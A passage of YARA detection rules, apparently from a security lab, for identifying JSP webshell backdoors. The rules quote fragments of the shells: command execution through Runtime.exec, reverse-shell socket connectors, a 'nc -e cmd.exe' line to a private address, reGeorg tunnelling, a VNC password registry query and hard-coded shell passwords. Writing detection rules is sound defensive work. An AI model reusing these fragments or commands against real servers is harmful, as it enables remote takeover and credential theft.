        $s3 = "38795; >>> Fucked at: \"+new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\").format(new Date())+\"</div>\";" fullword ascii
        $s4 = "response.setHeader(\"refresh\",\"1\");" fullword ascii
        $s5 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
        $s6 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
        $s7 = "<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>" fullword ascii
        $s8 = "String msg = \"<div style='margin-top:20px'>\"+p1+\"</div><div style='font-size:11px'>\"+request.getRemoteAddr()+\"&#30340;&#314" ascii
        $s9 = "String p1 = request.getParameter(\"what\");" fullword ascii
        $s10 = "<a style=\"letter-spacing:3px;\"><b>Hacked! Owned by Chinese Hackers!</b><br></a>" fullword ascii
        $s11 = "StringBuffer b = (StringBuffer) application.getAttribute(\"talks\");" fullword ascii
        $s12 = "bf = (StringBuffer) application.getAttribute(\"talks\");" fullword ascii
        $s13 = "pre{font-size:15pt;font-family:Times New Roman;line-height:120%;}" fullword ascii
        $s14 = "<%@page import=\"java.text.SimpleDateFormat\"%>" fullword ascii
        $s15 = "String msg = \"<div style='margin-top:20px'>\"+p1+\"</div><div style='font-size:11px'>\"+request.getRemoteAddr()+\"&#30340;&#314" ascii
        $s16 = "request.setCharacterEncoding(\"UTF-8\");" fullword ascii
        $s17 = "if (null == application.getAttribute(\"talks\")) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_37c5e3f810293ab5a645947d3b8b9386c404ccf5
{
    meta:
        description = "jsp - file 37c5e3f810293ab5a645947d3b8b9386c404ccf5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f32737638fdbf4f40a53f24869d2ff6b06ae3b908353b3da6e8fc10f806ede73"
    strings:
        $x1 = "Process process = Runtime.getRuntime().exec(\"cmd.exe\");" fullword ascii
        $s2 = "process.getOutputStream())).start();" fullword ascii
        $s3 = "(new StreamConnector(process.getInputStream()," fullword ascii
        $s4 = "socket.getOutputStream())).start();" fullword ascii
        $s5 = "while ((length = in.read(buffer, 0, buffer.length)) > 0) {" fullword ascii
        $s6 = "in = new BufferedReader(new InputStreamReader(this.is));" fullword ascii
        $s7 = "(new StreamConnector(socket.getInputStream()," fullword ascii
        $s8 = "<%@page import=\"java.lang.*\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule b0baca1d732c0704a7ae1ecd6d7229a4cb63222c
{
    meta:
        description = "jsp - file b0baca1d732c0704a7ae1ecd6d7229a4cb63222c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $x2 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
        $s3 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s4 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s7 = "System.out.println(strCommand);" fullword ascii
        $s8 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s9 = "strCommand[1]=strShell[1];" fullword ascii
        $s10 = "strCommand[0]=strShell[0];" fullword ascii
        $s11 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s12 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s13 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s14 = "<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s15 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s16 = "//out.println(path + f1.getName());" fullword ascii
        $s17 = "String[] strCommand=new String[3];" fullword ascii
        $s18 = "private final static int languageNo=1; //Language,0 : Chinese; 1:English" fullword ascii
        $s19 = "out.println(\"error,upload \");" fullword ascii
        $s20 = "strShell[0]=\"/bin/sh\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s08
{
    meta:
        description = "jsp - file s08.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "112ae6a3fa46155016644dcbc6d485a20307d21db56a0c51b873ec56d27696df"
    strings:
        $s1 = "socketChannel.connect(new InetSocketAddress(target, port));" fullword ascii
        $s2 = "https://github.com/sensepost/reGeorg" fullword ascii
        $s3 = "etienne@sensepost.com / @kamp_staaldraad" fullword ascii
        $s4 = "} else if (cmd.compareTo(\"FORWARD\") == 0){" fullword ascii
        $s5 = "System.out.println(e.getMessage());" fullword ascii
        $s6 = "System.out.println(ex.getMessage());" fullword ascii
        $s7 = "sam@sensepost.com / @trowalts" fullword ascii
        $s8 = "int readlen = request.getContentLength();" fullword ascii
        $s9 = "willem@sensepost.com / @_w_m__" fullword ascii
        $s10 = "} else if (cmd.compareTo(\"READ\") == 0){" fullword ascii
        $s11 = "request.getInputStream().read(buff, 0, readlen);" fullword ascii
        $s12 = "SocketChannel socketChannel = (SocketChannel)session.getAttribute(\"socket\");" fullword ascii
        $s13 = "response.setHeader(\"X-ERROR\", e.getMessage());" fullword ascii
        $s14 = "String target = request.getHeader(\"X-TARGET\");" fullword ascii
        $s15 = "IOException, java.net.UnknownHostException, java.net.Socket\" %><%" fullword ascii
        $s16 = "response.setHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
        $s17 = "String cmd = request.getHeader(\"X-CMD\");" fullword ascii
        $s18 = "} else if (cmd.compareTo(\"DISCONNECT\") == 0) {" fullword ascii
        $s19 = "int port = Integer.parseInt(request.getHeader(\"X-PORT\"));" fullword ascii
        $s20 = "if (cmd.compareTo(\"CONNECT\") == 0) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule f9b9b3cdb3e9a11e528aed1ef68182a0140a4b8d
{
    meta:
        description = "jsp - file f9b9b3cdb3e9a11e528aed1ef68182a0140a4b8d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "27c8aec29a8312a15eb47b233904396dfacc06013d02e12a4d5b9efdba746f68"
    strings:
        $x1 = "return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);" fullword ascii
        $s2 = "out.write((\"User:\\t\"+exec(\"whoami\")).getBytes());" fullword ascii
        $s3 = "shell(request.getParameter(\"host\"), Integer.parseInt(request.getParameter(\"port\")));" fullword ascii
        $s4 = "out.println(exec(request.getParameter(\"cmd\")));" fullword ascii
        $s5 = "public static void shell(String host,int port) throws UnknownHostException, IOException{" fullword ascii
        $s6 = "out.println(auto(request.getParameter(\"url\"),request.getParameter(\"fileName\"),request.getParameter(\"cmd\")));" fullword ascii
        $s7 = "out.write(exec(new String(b,0,a,\"UTF-8\").trim()).getBytes(\"UTF-8\"));" fullword ascii
        $s8 = "encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;" fullword ascii
        $s9 = "download(request.getParameter(\"url\"), request.getParameter(\"path\"));" fullword ascii
        $s10 = "public static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{" fullword ascii
        $s11 = "public static void download(String url,String path) throws MalformedURLException, IOException{" fullword ascii
        $s12 = "public static String exec(String cmd) {" fullword ascii
        $s13 = "return System.getProperty(\"sun.jnu.encoding\");" fullword ascii
        $s14 = "copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);" fullword ascii
        $s15 = "* @throws UnknownHostException" fullword ascii
        $s16 = "String out = exec(cmd);" fullword ascii
        $s17 = "* @param host" fullword ascii
        $s18 = "cmd /c dir " fullword ascii
        $s19 = "* @param cmd" fullword ascii
        $s20 = "public static String getSystemEncoding(){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_52ed07e55c6e6d640ffc2c6371c585ce063f6329
{
    meta:
        description = "jsp - file 52ed07e55c6e6d640ffc2c6371c585ce063f6329.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "df204c8c4accc4a508a86a91a63700ea4cf803dd273272c746f94a77ec933d23"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $x2 = "+ \"           <option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $x3 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql" fullword ascii
        $x4 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        $x5 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
        $x6 = "+ \"     <a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
        $s7 = ".println(\"<select id=\\\"catalogs\\\" onchange=\\\"if (this.value == '0') return;doPost({o:'executesql',type:'switch',cata" fullword ascii
        $s8 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
        $s9 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
        $s10 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s11 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
        $s12 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
        $s13 = "+ \" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\\\\nin" fullword ascii
        $s14 = ".println(\"<a href=\\\"javascript:new fso({}).packBatch();\\\">Pack Selected</a> - <a href=\\\"javascript:new fso({}).del" fullword ascii
        $s15 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
        $s16 = "+ \"           <option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc h" fullword ascii
        $s17 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
        $s18 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
        $s19 = "+ \"     <a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
        $s20 = "+ \"     var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 500KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule fead711bab09ddcd9d526d05529ef0c314565565
{
    meta:
        description = "jsp - file fead711bab09ddcd9d526d05529ef0c314565565.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a7fab64062972d0a6adb905d2b9aa3b193c48a4f951c6db370b1b809f25235f1"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s9 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s10 = "private static final String PW = \"admin\"; //password" fullword ascii
        $s11 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s12 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
        $s13 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s14 = "* CY . I Love You." fullword ascii
        $s15 = "* by n1nty" fullword ascii
        $s16 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s17 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
        $s18 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c8e1ddd7c5016d152ce2459980982ed4ebf200a0
{
    meta:
        description = "jsp - file c8e1ddd7c5016d152ce2459980982ed4ebf200a0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"xfgSS\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s15 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s16 = "while (tempLine != null)" fullword ascii
        $s17 = "HttpURLConnection url_con = null;" fullword ascii
        $s18 = "private static int readTimeOut = 10000;" fullword ascii
        $s19 = "url_con.getOutputStream().close();" fullword ascii
        $s20 = "url_con.getOutputStream().flush();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_43ca670ff08b88b84e7a98e562c80e12070b22dd
{
    meta:
        description = "jsp - file 43ca670ff08b88b84e7a98e562c80e12070b22dd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f5daeeedd81105cfad0fde7d779f4e7b700e83b88e6a630453a566256bff0fb1"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.ge" fullword ascii
        $s2 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"utf-8\");   " fullword ascii
        $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"utf-8\");   " fullword ascii
        $s4 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestUR" ascii
        $s5 = ":</font><%out.print(request.getRealPath(request.getServletPath())); %>   " fullword ascii
        $s6 = "<form name=\"frmUpload\" method=\"post\" action=\"\">   " fullword ascii
        $s7 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>   " fullword ascii
    condition:
        ( uint16(0) == 0x200a and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule cc3205c727a134525f1d5f7f8e9f9dacf16f6419
{
    meta:
        description = "jsp - file cc3205c727a134525f1d5f7f8e9f9dacf16f6419.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "47b320e30bd9f4ebc6467502f3ec256c4ece135626aa92cbd795a6b9fb661692"
    strings:
        $x1 = "Powered by <a href=\"http://dingody.iteye.com\" target=\"_blank\">dingo</a>" fullword ascii
        $x2 = "doPost({\"action\":\"ExecuteCommand\",\"commandAction\":\"exec\",\"command\":command,\"charset\":charset});" fullword ascii
        $x3 = "out.println(\"Execute Command &raquo;<br>\");" fullword ascii
        $s4 = "href=\"javascript:g('ExecuteCommand');\">Execute Command</a>" fullword ascii
        $s5 = "} else if (action.equals(\"ExecuteCommand\")) {" fullword ascii
        $s6 = "+ \"\\\"> username:<input id=\\\"dbport\\\" name=\\\"dbport\\\" type=\\\"text\\\" disabled=\\\"disabled\\\" value=\\\"\"" fullword ascii
        $s7 = "session.setAttribute(\"login\", \"j-Spy by dingo\");" fullword ascii
        $s8 = "File tmpFile = (File) fList.get(fList.size() - i" fullword ascii
        $s9 = "doPost({\"action\":\"FileManager\",\"fileAction\":\"create\",\"pathing\":path,\"content\":content,\"charset\":charset});" fullword ascii
        $s10 = "url = \"jdbc:oracle:thin:\" + host + \":\" + port + \"/\" + db;" fullword ascii
        $s11 = "if ((i = tmpString.indexOf(\"Content-Type:\")) != -1) {" fullword ascii
        $s12 = "doPost({\"action\":\"DatabaseManager\",\"dbAction\":\"login\",\"dbtype\":dbtype,\"dbhost\":dbhost,\"dbport\":dbport,\"dbusername" ascii
        $s13 = "doPost({\"action\":\"DatabaseManager\",\"dbAction\":\"login\",\"dbtype\":dbtype,\"dbhost\":dbhost,\"dbport\":dbport,\"dbusername" ascii
        $s14 = "out.println(\"host:<input id=\\\"dbhost\\\" name=\\\"dbhost\\\" type=\\\"text\\\" value=\\\"127.0.0.1\\\"> port:<input id=\\\"db" ascii
        $s15 = "out.println(\"host:<input id=\\\"dbhost\\\" name=\\\"dbhost\\\" type=\\\"text\\\"  disabled=\\\"disabled\\\" value=\\\"\"" fullword ascii
        $s16 = "out.println(\"<style type=\\\"text/css\\\">input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}" ascii
        $s17 = "String port = (request.getParameter(\"port\") == null) ? \"21,22,25,80,110,135,139,445,1433,3306,3389,5631,43958\"" fullword ascii
        $s18 = "private DB(HttpSession s, JspWriter out, String type, String host," fullword ascii
        $s19 = "+ session.getAttribute(\"dbhost\")" fullword ascii
        $s20 = "if (session.getAttribute(\"login\") == null) {" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ff6e83c72acf21c58d67873de03ec26c31347731
{
    meta:
        description = "jsp - file ff6e83c72acf21c58d67873de03ec26c31347731.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
    strings:
        $x1 = "<a href=\"http://www.whylover.com\" target=\"_blank\">www.hmilyld.cn</a> By Hmilyld" fullword ascii
        $s2 = "Process p = Runtime.getRuntime().exec(" fullword ascii
        $s3 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
        $s4 = "sbFolder.append(\"','\"+formatPath(strDir)+\"\\\\\\\\hZipFile.zip','\" + strCmd + \"','1','');\\\">\");" fullword ascii
        $s5 = "Hmilyld:<a href=\"http://www.hmilyld.cn\" target=\"_blank\">http://www.hmilyld.cn</a> <a href=\"http://www.whylover.com\" target" ascii
        $s6 = "Hmilyld:<a href=\"http://www.hmilyld.cn\" target=\"_blank\">http://www.hmilyld.cn</a> <a href=\"http://www.whylover.com\" target" ascii
        $s7 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
        $s8 = "onClick=\"return expandcontent('menu2', this)\"><%=strCommand[languageNo]%></a>" fullword ascii
        $s9 = "out.println(\"<li>Start Memory:\" + startMem + \"</li>\");" fullword ascii
        $s10 = "&& request.getParameter(\"password\").equals(password)) {" fullword ascii
        $s11 = "\"cmd /c \" + strCmd);" fullword ascii
        $s12 = "out.println(\"<li>End Memory:\" + endMem + \"</li>\");" fullword ascii
        $s13 = "out.println(\"<li>Total Memory:\" + total + \"</li>\");" fullword ascii
        $s14 = "out.println(\"<li>Use Time: \" + (endTime - startTime) + \"</li>\");" fullword ascii
        $s15 = "out.println(\"<li>Use memory: \" + (startMem - endMem) + \"</li>\");" fullword ascii
        $s16 = "&lt;li&gt;&lt;%=key%&gt;:&lt;%=props.get(key)%&gt;&lt;/li&gt;<br />" fullword ascii
        $s17 = "if (request.getParameter(\"password\") != null" fullword ascii
        $s18 = "sbFolder.append(\"- - - - - - - - - - - </td></tr>\\r\\n\");" fullword ascii
        $s19 = "String[] strExecute = { \"" fullword ascii
        $s20 = "sbFile.append(\"\" + list[i].getName());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b0456b5fb1b3501c2732e3a64157a95109f175dd
{
    meta:
        description = "jsp - file b0456b5fb1b3501c2732e3a64157a95109f175dd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6b4e479af8f1890e3d56bdf85186f380ba971d4ddc2ca261d076597f290e1456"
    strings:
        $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
        $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
        $s3 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
        $s4 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
        $s5 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
        $s6 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
        $s7 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
        $s8 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s9 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
        $s10 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s11 = "BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));" fullword ascii
        $s12 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
        $s13 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
        $s14 = "String Z = EC(request.getParameter(Pwd) + \"\");" fullword ascii
        $s15 = "sb.append(r.getObject(i)+\"\" + \"\\t|\\t\");" fullword ascii
        $s16 = "BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));" fullword ascii
        $s17 = "while ((n = is.read(b)) != -1) {" fullword ascii
        $s18 = "return new String(s.getBytes(\"ISO-8859-1\"),cs);" fullword ascii
        $s19 = "void FF(String s, HttpServletResponse r) throws Exception {" fullword ascii
        $s20 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8e67a916b31b0a1c1bfc4e6a7ad0e575f2fa9e52
{
    meta:
        description = "jsp - file 8e67a916b31b0a1c1bfc4e6a7ad0e575f2fa9e52.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4fa29f9bce15414569b77800026497c3156fb80b17db58b226f140e50022997a"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(\"cmd.exe /c dir \\\"\" + file.getAbsolutePath() + \"\\\" /tc\");   " fullword ascii
        $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>   " fullword ascii
        $s3 = "out.println(\"<script lanugage=\\\"javascript\\\">alert(\\\"time error!\\\");history.back();</script>\");   " fullword ascii
        $s4 = "<%@ page language=\"java\" import=\"java.util.Enumeration\" contentType=\"text/html; charset=GB2312\"%>   " fullword ascii
        $s5 = "BufferedReader br = new BufferedReader(new InputStreamReader(ls_proc.getInputStream()));   " fullword ascii
        $s6 = "<form name= form1 method=\"post\" action=\"?action=getinfo\">   " fullword ascii
        $s7 = "String filepath = folderReplace(request.getParameter(\"file\"));   " fullword ascii
        $s8 = "<input type=\"submit\" name=\"Button\" value=\"getinfo\"/>   " fullword ascii
        $s9 = "<form name= form2 method=\"post\" action=\"?action=change\">   " fullword ascii
        $s10 = "out.println(\"<script lanugage=\\\"javascript\\\">alert(\\\"file:\"+filepath+\" not find!\\\");history.back();</script>\");     " ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_2d0a76576f13c70a3d1a0d8d4e7453382adefdbc
{
    meta:
        description = "jsp - file 2d0a76576f13c70a3d1a0d8d4e7453382adefdbc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4bfe0d96c929ca04283f61b88dc2382fa4f5f6ea5735f0c3d3900c590e98bda6"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s7 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s8 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s9 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s10 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s11 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s12 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s13 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s14 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s15 = ".charAt(i + 1))));" fullword ascii
        $s16 = ".write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d" fullword ascii
        $s17 = "void FF(String s, HttpServletResponse r) throws Exception {" fullword ascii
        $s18 = "}//new String(s.getBytes(\"ISO-8859-1\"),c);}" fullword ascii
        $s19 = "new InputStreamReader(new FileInputStream(new File(" fullword ascii
        $s20 = "void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule e4fa5772ddaac60c0a4299ff51dc46f5ef63d859
{
    meta:
        description = "jsp - file e4fa5772ddaac60c0a4299ff51dc46f5ef63d859.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
